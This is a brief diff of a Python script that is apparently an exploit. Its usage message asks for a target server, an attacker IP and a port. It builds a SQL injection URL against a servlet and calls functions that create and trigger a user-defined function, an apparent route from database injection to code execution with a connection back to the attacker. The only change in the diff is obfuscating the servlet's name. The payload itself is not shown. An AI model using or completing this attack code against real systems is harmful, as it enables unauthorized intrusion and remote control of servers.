@@ -34,6 +34,6 @@ if __name__ == '__main__':
     except IndexError:
         print("[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0])
 
-sqli_url = "https://"+server+"/servlet/AMUserResourcesSyncServlet"
+sqli_url = "https://"+server+"/servlet/AxxxxSyncServlet"
 create_udf_func(sqli_url)
 trigger_udf(sqli_url)
